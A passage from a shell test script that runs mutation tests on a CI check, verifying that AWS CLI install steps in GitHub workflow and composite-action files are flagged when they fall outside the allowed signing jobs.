if [ "$mj" = "release.yml:build-freeze" ]; then ok "KA-2 p4 r2 1b' mutant: an aws CLI install step in the first job of release.yml ($mj) is outside the allowed signing jobs, so the tree-level check is red"; else bad "KA-2 p4 r2 1b' mutant: the aws CLI install in a release.yml build job was not found outside the allowed jobs ($mj)"; fi
# KA-2 p4 r2 C4: the file set is .y*ml in workflows and action.y*ml under .github/actions (a .yaml workflow, a composite action), and `aws-cli` is matched quoted as well as bare
mkdir -p "$work/awstree/.github/workflows" "$work/awstree/.github/actions/x/y"
printf 'jobs:\n  j:\n    steps:\n      - run: bash bin/install-scanner.sh aws-cli\n' > "$work/awstree/.github/workflows/w.yaml"
mapfile -t tf < <(awsfiles "$work/awstree"); mj=$(awsjobs "${tf[@]}")
if [ "$mj" = "w.yaml:j" ] && ! grep -qxF "$mj" <<< "$ALLOWED_AWS_JOBS"; then ok "KA-2 p4 r2 C4 mutant: an aws CLI install in a .yaml workflow ($mj) is found and is outside the allowed signing jobs"; else bad "KA-2 p4 r2 C4 mutant: the aws CLI install in a .yaml workflow was not found by the scan ($mj)"; fi
rm -f "$work/awstree/.github/workflows/w.yaml"
printf 'jobs:\n  j:\n    steps:\n      - run: bash bin/install-scanner.sh "aws-cli"\n' > "$work/awstree/.github/workflows/q.yml"
mapfile -t tf < <(awsfiles "$work/awstree"); mj=$(awsjobs "${tf[@]}")
if [ "$mj" = "q.yml:j" ] && ! grep -qxF "$mj" <<< "$ALLOWED_AWS_JOBS"; then ok "KA-2 p4 r2 C4 mutant: a quoted \"aws-cli\" install ($mj) is found and is outside the allowed signing jobs"; else bad "KA-2 p4 r2 C4 mutant: the quoted \"aws-cli\" install was not found by the scan ($mj)"; fi
EXPECT=452
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
